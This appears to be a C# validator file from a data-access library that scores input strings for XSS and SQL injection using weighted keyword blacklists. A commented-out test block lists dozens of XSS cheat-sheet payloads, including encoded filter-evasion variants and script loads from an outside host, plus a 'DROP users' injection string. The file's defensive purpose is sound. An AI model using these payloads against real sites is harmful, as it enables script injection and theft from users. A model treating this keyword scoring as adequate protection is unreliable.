
using Pure.Data.i18n;
using Pure.Data.Validations.Validators;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Pure.Data.Validations
{
    public class PropertySecurityValidate : PropertyValidator
    {
        private static PropertySecurityValidate _instance = null;
        private static object olock = new object();
        public static PropertySecurityValidate Instance
        {
            get
            {
                if (_instance == null)
                {
                    lock (olock)
                    {
                        _instance = new PropertySecurityValidate();
                    }

                }
                return _instance;
            }
        }
        public PropertySecurityValidate()
           : base(() => Messages.stringsafety_error)
        {

        }

        protected override bool IsValid(PropertyValidatorContext context)
        {

            var database = context.ParentContext.Database;
            if (database.Config.EnableDefaultPropertySecurityValidate)
            {
                bool result = false;

                var validate = PropertySecurityValidateManage.Instance.Get(database.Config.PropertySecurityValidateClassName);
                if (validate != null)
                {
                    result = validate.IsValid(context);
                }
                else
                {

                    //默认校验器
                    if (context.PropertyValue == null) return true;

                    string _String = context.PropertyValue.ToString();
                    result = StringSecurityHelper.CheckForXss(_String) < 201;


                }
                return result;
            }
            else
            {
                return true;
            }


        }

    }

    public interface IPropertySecurityValidate //: IDisposable
    {
        bool IsValid(PropertyValidatorContext context);

    }

    public class PropertySecurityValidateManage : Singleton<PropertySecurityValidateManage>
    {
        public ConcurrentDictionary<string, IPropertySecurityValidate> providers = null;
        public PropertySecurityValidateManage()
        {
            providers = new ConcurrentDictionary<string, IPropertySecurityValidate>();
        }

        public void Register(string className, IPropertySecurityValidate opt)
        {
            providers[className] = opt;
        }

        public IPropertySecurityValidate Get(string className)
        {
            if (providers == null || providers.Count == 0)
            {
                return null;
                //throw new PureDataException("Please config PureDataConfiguration in `PropertySecurityValidateClassName` or register IPropertySecurityValidate before use !", null);
            }
            return providers[className];

        }


    }


    /// <summary>字符串助手类</summary>
    internal static class StringSecurityHelper
    {
        private static string[] _sqlExtremelyDangerousCharacters = { "--", "#" };
        private static string[] _sqlDangerousCharacters = { "'", ";", "=", "&", "<", ">", "*", "\"" };
        private static string[] _sqlExtremelyDangerousStrings = { "drop", "insert", "delete", "truncate", "update", "alter", "exec", "xp_cmdshell" };
        private static string[] _sqlDangerousStrings = { "select", "null", "count", "like", "values", "into" };

        private static string[] _xssExtremelyDangerousCharacters = { "<", ">" };
        private static string[] _xssDangerousCharacters = { "'", ";", "!", "-", "=", "&", "{", "(", ")", "}", "#", "\"" };
        private static string[] _xssExtremelyDangerousStrings = { "fromcharcode", "script", "javascript", "object", ".js", "vbscript", "allowscriptaccess", "activex" };
        private static string[] _xssDangerousStrings = { "iframe", "object", "input", "dynsrc", "lowsrc", "size", "link", "href", "rel", "import", "moz-binding", "htc", "mocha", "livescript", "content", "embed", "src" };

        private static Regex _whiteSpace = new Regex(@"[\c\r\n\t\0]", RegexOptions.CultureInvariant | RegexOptions.Compiled);
        private static Regex _findMultiSpaces = new Regex(@"[\ ]{2,}", RegexOptions.Multiline | RegexOptions.CultureInvariant | RegexOptions.Compiled);
        private static Regex _findHex = new Regex(@"\&\#x[0-9a-fA-F]{0,3}\;?|\%[0-9a-fA-F]{0,2}\;?", RegexOptions.CultureInvariant | RegexOptions.Compiled);
        private static Regex _findUnicode = new Regex("\\&\\#(?:0000)?(\\d{3})", RegexOptions.CultureInvariant | RegexOptions.Compiled);
        #region Common attack checks

        /// <summary>
        /// Checks a string for XSS.
        /// Returns the possibility factor of the string containing a XSS attack.
        /// If it's 71+, then its a potential attack
        /// If it's 201+, then it's a XSS attack.
        /// Most real XSS attacks score from 700 and up
        /// </summary>
        /// <param name="input">The input.</param>
        /// <returns>The posibility factor</returns>
        public static int CheckForXss(string input)
        {
            int weight = 0;

            string temp = NormalizeData(input);

            foreach (string edc in _xssExtremelyDangerousCharacters)
            {
                if (temp.Contains(edc))
                    weight += 200;
            }

            foreach (string dc in _xssDangerousCharacters)
            {
                if (temp.Contains(dc))
                    weight += 35;
            }

            foreach (string eds in _xssExtremelyDangerousStrings)
            {
                if (temp.Contains(eds))
                    weight += 200;
            }

            foreach (string ds in _xssDangerousStrings)
            {
                if (temp.Contains(ds))
                    weight += 100;
            }

            return weight;
        }

        /// <summary>
        /// Checks for SQL injection.
        /// Returns the possibility factor of the string containing a SQL injection attack.
        /// If it's 71+, then its a potential attack
        /// If it's 201+, then it's a SQL injection attack.
        /// Most real SQL injection attacks score from 300 and up
        /// </summary>
        /// <param name="input">The input.</param>
        /// <returns></returns>
        public static int CheckForSqlInjection(string input)
        {
            int weight = 0;

            string temp = NormalizeData(input);

            foreach (string edc in _sqlExtremelyDangerousCharacters)
            {
                if (temp.Contains(edc))
                    weight += 200;
            }

            foreach (string dc in _sqlDangerousCharacters)
            {
                if (temp.Contains(dc))
                    weight += 35;
            }

            foreach (string eds in _sqlExtremelyDangerousStrings)
            {
                if (temp.Contains(eds))
                    weight += 200;
            }

            foreach (string ds in _sqlDangerousStrings)
            {
                if (temp.Contains(ds))
                    weight += 100;
            }

            return weight;
        }

        #endregion

        #region Normalize data and encoding

        /// <summary>
        /// This is only to be used when checking for attacks. It decodes html, removes multispaces, tabs and newlines,
        /// converts hex to ascii and converts unicode to ansi.
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        public static string NormalizeData(string data)
        {
            string temp = string.Empty;

            if (!string.IsNullOrEmpty(data))
            {
                //Converts the string to lowercase and decodes the encoded html in the string
                temp = data.ToLowerInvariant();
                // temp = HtmlDecodeCharacters(data.ToLowerInvariant());

                // Finds multispaces and replaces them with a single space
                temp = RemoveMultipleSpaces(temp);

                // Finds tabs, newlines and returns and removes them
                temp = RemoveTabsAndNewLines(temp);

                // Finds any hex in the string and replaces it with ASCII
                temp = ConvertHexToAscii(temp);

                // Converts unicode to ansi characters
                temp = ConvertUnicode(temp);
            }
            return temp;
        }

        /// <summary>
        /// Converts long and short format unicode to ASCII
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>
        public static string ConvertUnicode(string input)
        {
            if (!string.IsNullOrEmpty(input))
            {
                foreach (Match match in _findUnicode.Matches(input))
                {
                    input = input.Replace(match.Value, Convert.ToString(Convert.ToChar(short.Parse(match.Groups[1].Value))));
                }
            }

            return input;
        }

        /// <summary>
        /// Removes several spaces in a row and replaces them with a single space
        /// </summary>
        /// <param name="input">The input.</param>
        /// <returns>Returns the string with removed spaces</returns>
        public static string RemoveMultipleSpaces(string input)
        {
            if (!string.IsNullOrEmpty(input))
                return _findMultiSpaces.Replace(input, " ");

            return string.Empty;
        }

        /// <summary>
        /// Removes tabs and newlines from the input
        /// </summary>
        /// <param name="input">The input.</param>
        /// <returns></returns>
        public static string RemoveTabsAndNewLines(string input)
        {
            if (!string.IsNullOrEmpty(input))
                return _whiteSpace.Replace(input, string.Empty);

            return string.Empty;
        }

        /// <summary>
        /// Converts the hex input to a string in ASCII
        /// </summary>
        /// <param name="hexValue">The hex string.</param>
        /// <returns>Returns a ASCII string</returns>
        public static string ConvertHexToAscii(string hexValue)
        {
            if (!string.IsNullOrEmpty(hexValue))
            {
                char[] cleanChars = { '&', '#', 'x', ';', '%' };

                foreach (Match match in _findHex.Matches(hexValue))
                {
                    string matchValueCleaned = match.Value;

                    foreach (char c in cleanChars)
                    {
                        matchValueCleaned = matchValueCleaned.Replace(c, ' ').Trim();
                    }

                    if (!string.IsNullOrEmpty(matchValueCleaned))
                    {
                        char hexChar = (char)int.Parse(matchValueCleaned, NumberStyles.AllowHexSpecifier, CultureInfo.InvariantCulture);
                        hexValue = hexValue.Replace(match.Value, hexChar.ToString(CultureInfo.InvariantCulture));
                    }
                }
            }

            return hexValue;
        }

        ///// <summary>
        ///// Encode HTML
        ///// </summary>
        ///// <param name="input">The input.</param>
        ///// <returns>A string of encoded characters</returns>
        //public static string HtmlEncodeCharacters(string input)
        //{
        //    string encoded = string.Empty;
        //    if (!string.IsNullOrEmpty(input))
        //    {
        //        encoded = HttpUtility.HtmlEncode(input);
        //    }
        //    return encoded;
        //}

        ///// <summary>
        ///// Decode HTML
        ///// </summary>
        ///// <param name="input"></param>
        ///// <returns></returns>
        //public static string HtmlDecodeCharacters(string input)
        //{
        //    string decoded = string.Empty;
        //    if (!string.IsNullOrEmpty(input))
        //        decoded = HttpUtility.HtmlDecode(input);

        //    return decoded;
        //}

        #endregion


    }


    /*


          //ha.ckers.org XSS cheat sheet
                Dictionary<string, int> list = new Dictionary<string, int>();

                //URL encoding calculator
                list.Add("';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", 610);

                //XSS locator 2
                list.Add("'';!--\"<XSS>=&{()}", 785);

                //No filter evasion
                list.Add("<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", 635);

                //Image XSS
                list.Add("<IMG SRC=\"javascript:alert('XSS');\">", 610);

                //No quotes and no semicolon
                list.Add("<IMG SRC=javascript:alert('XSS')>", 540);

                //Case insensitive
                list.Add("<IMG SRC=JaVaScRiPt:alert('XSS')>", 540);

                //HTML entities
                list.Add("<IMG SRC=javascript:alert(&quot;XSS&quot;)>", 540);

                //Grave accent
                list.Add("<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", 575);

                //Begeek
                list.Add("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", 505);

                //here
                list.Add("<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", 505);

                //XSS calculator
                list.Add("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", 540);

                //Long UTF-8 Unicode
                list.Add("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", 940);

                //XSS calculator
                list.Add("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", 940);

                //Embedded tab
                list.Add("<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", 610);

                //ascii chart
                list.Add("<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", 610);

                //Embedded carriage return
                list.Add("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", 610);

                //Multiline
                list.Add("<IMG&#x0D;SRC&#x0D;=&#x0D;\"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;'&#x0D;X&#x0D;S&#x0D;S&#x0D;'&#x0D;)&#x0D;\"&#x0D;>&#x0D;", 575);

                //vim
                list.Add("perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out", 645);

                //Null
                list.Add("perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out", 610);

                //Spaces and meta chars
                list.Add("<IMG SRC=\" &#14;  javascript:alert('XSS');\">", 610);

                //Non-alpha-non-digit
                list.Add("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", 670);

                //Non-alpha-non-digit part 2
                list.Add("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", 715);

                //Yair Amit
                list.Add("<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", 670);

                //Extraneous open brackets
                list.Add("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", 540);

                //No closing script tags
                list.Add("<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>", 635);

                //Protocol resolution in script tags
                list.Add("<SCRIPT SRC=//ha.ckers.org/.j>", 435);

                //the following NIDS regex
                list.Add("<IMG SRC=\"javascript:alert('XSS')\"", 375);

                //Steven Christey
                list.Add("<iframe src=http://ha.ckers.org/scriptlet.html <", 235);

                //XSS with no single quotes or double quotes or semicolons
                list.Add("<SCRIPT>a=/XSS/", 435);

                //XSS locator
                list.Add("\";alert('XSS');//", 175);

                //End title tag
                list.Add("</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>", 540);

                //INPUT image
                list.Add("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", 710);

                //BODY image
                list.Add("<BODY BACKGROUND=\"javascript:alert('XSS')\">", 575);

                //Dan Crowley
                list.Add("<BODY ONLOAD=alert('XSS')>", 540);

                foreach (KeyValuePair<string, int> xss in list)
                {
                    Assert.AreEqual(xss.Value, Validator.CheckForXss(xss.Key));
                }

                //Own check
                const string xss2 = "<ScRiPt     lAnguage=JavaScript>alert(document.cookie); var hextest=%74%65%73%74; </sCrIpt>";
                Assert.AreEqual(540, Validator.CheckForXss(xss2));




         [TestMethod]
            public void SQLInjectionCheck()
            {
                int attackVector = Validator.CheckForSqlInjection("';         DrOP users    --");
                Assert.AreEqual(270, attackVector);
            }



         */




}
